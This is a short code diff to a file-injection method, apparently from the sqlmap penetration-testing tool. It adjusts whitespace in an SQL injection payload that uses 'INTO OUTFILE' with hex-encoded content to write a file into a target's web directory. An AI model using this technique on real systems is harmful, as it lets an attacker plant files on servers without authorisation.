@@ -99,9 +99,9 @@ class Web:
     def __webFileInject(self, fileContent, fileName, directory):
         outFile     = posixpath.normpath("%s/%s" % (directory, fileName))
         uplQuery    = fileContent.replace("WRITABLE_DIR", directory.replace('/', '\\') if kb.os == "Windows" else directory)
-        query       = " LIMIT 1 INTO OUTFILE '%s' " % outFile
+        query       = "LIMIT 1 INTO OUTFILE '%s' " % outFile
         query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
-        query       = agent.prefixQuery(" %s" % query)
+        query       = agent.prefixQuery(query)
         query       = agent.postfixQuery(query)
         payload     = agent.payload(newValue=query)
         page        = Request.queryPage(payload)
